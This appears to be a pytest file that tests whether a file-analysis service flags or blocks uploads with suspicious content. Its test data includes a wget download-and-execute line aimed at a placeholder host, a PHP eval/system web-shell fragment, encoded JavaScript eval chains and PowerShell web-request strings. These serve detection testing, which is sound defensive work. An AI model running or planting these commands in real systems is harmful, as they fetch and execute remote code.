import io
import sys
from pathlib import Path

import pytest
from starlette.datastructures import UploadFile

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from backend.services.alerts_service import AlertsService
from backend.services.file_analysis_service import FileAnalysisService


class FakeSession:
    def add(self, obj):
        return None

    def commit(self):
        return None

    def refresh(self, obj):
        return None


def _service() -> FileAnalysisService:
    try:
        return FileAnalysisService.get_instance()
    except RuntimeError:
        models_store = ROOT / "backend" / "data" / "models_store"
        yara_rules = ROOT / "backend" / "yara_rules" / "basic_rules.yar"
        return FileAnalysisService(
            ml_model_path=str(models_store / "file_analyzer_v1.joblib"),
            yara_rules_path=str(yara_rules),
            alerts_service=AlertsService(),
        )


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "filename,payload,expected_marker,hard_marker",
    [
        (
            "new12.txt",
            b"wget http://example.com/malware -O file && sh file",
            "download_execute_chain",
            True,
        ),
        (
            "new13.txt",
            b'powershell -Command "Invoke-WebRequest test"',
            "powershell_web_request",
            False,
        ),
        (
            "new22.py",
            b'import os <script>eval("test")</script>',
            "eval_script_tag",
            False,
        ),
        (
            "new25.txt",
            b"powershell + php + js mixed execution",
            "stacked_execution_keywords",
            False,
        ),
        (
            "new41.txt",
            b"eval($_GET['x']) + base64 + system",
            "script_eval_exec_combo",
            True,
        ),
        (
            "new48.txt",
            b"powershell Invoke + encoded + hidden",
            "powershell_obfuscation",
            False,
        ),
        (
            "new7.py",
            b"eval(String.fromCharCode(97,108,101,114,116))",
            "decoded_eval_chain",
            True,
        ),
        (
            "new9.sh",
            b'var a = atob("dGVzdA=="); eval(a);',
            "decoded_eval_chain",
            True,
        ),
    ],
)
async def test_gap_payloads_are_not_allowed_anymore(
    filename: str,
    payload: bytes,
    expected_marker: str,
    hard_marker: bool,
):
    svc = _service()
    result = await svc.analyze_file(
        FakeSession(),
        UploadFile(file=io.BytesIO(payload), filename=filename),
    )

    overall = result["overall_assessment"]
    malware = result["file_details"]["malware_scan"]
    details = malware.get("scan_details") or {}
    exec_markers = set(details.get("exec_markers") or [])

    assert expected_marker in exec_markers, (filename, exec_markers)
    assert overall["recommended_action"] != "ALLOW_UPLOAD", (filename, overall)
    assert str(overall["overall_status"] or "").lower() != "safe", (filename, overall)

    if hard_marker:
        assert overall["recommended_action"] in {"FLAG_FOR_REVIEW_BLOCK", "BLOCK_AND_QUARANTINE"}, (filename, overall)
    else:
        assert overall["recommended_action"].startswith("FLAG"), (filename, overall)
